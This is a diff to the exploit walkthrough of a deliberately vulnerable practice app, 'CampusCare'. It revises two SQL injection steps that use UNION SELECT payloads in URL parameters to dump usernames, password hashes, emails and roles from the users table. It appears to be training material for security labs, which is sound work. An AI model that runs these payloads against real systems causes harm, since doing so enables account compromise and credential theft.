@@ -53,7 +53,7 @@ CampusCare is packed with vulnerabilities across multiple categories. Here is a 
 *   **How to Exploit:**
     1. Navigate to the Search page and select a class filter.
     2. Look at the URL in your browser: `http://localhost:3000/search?q=&class=XII`
-    3. Modify the URL parameter directly in your browser's address bar: `http://localhost:3000/search?q=&class=XII' UNION SELECT id,username,password,email,role,admission_no FROM users--`
+    3. Modify the URL parameter directly in your browser's address bar: `http://localhost:3000/search?q=&class=XII' UNION SELECT id,username,password,role,admission_no FROM users--`
     4. Hit Enter to dump the `users` table, including password hashes.
 
 #### 4. SQLi — Profile ID (`UNION` / Blind)
@@ -61,8 +61,8 @@ CampusCare is packed with vulnerabilities across multiple categories. Here is a 
 *   **Vulnerability:** The profile ID from the URL is not validated and is interpolated directly into the SQL query on the backend API.
 *   **How to Exploit:**
     1. Navigate to a profile, e.g., `http://localhost:3000/profile/1`.
-    2. Modify the URL ID to inject SQL: `http://localhost:3000/profile/0 UNION SELECT id,username,password,email,role,admission_no FROM users LIMIT 1--`
-    3. The profile page will render the dumped data in place of the user's profile details.
+    2. Modify the URL ID to inject SQL: `http://localhost:3000/profile/0 UNION SELECT id,username,email,password,NULL,NULL,admission_no,role FROM users LIMIT 1--`
+    3. The profile page will render the dumped password as the user's "full_name" and their role under "Security Role".
 
 ---
 
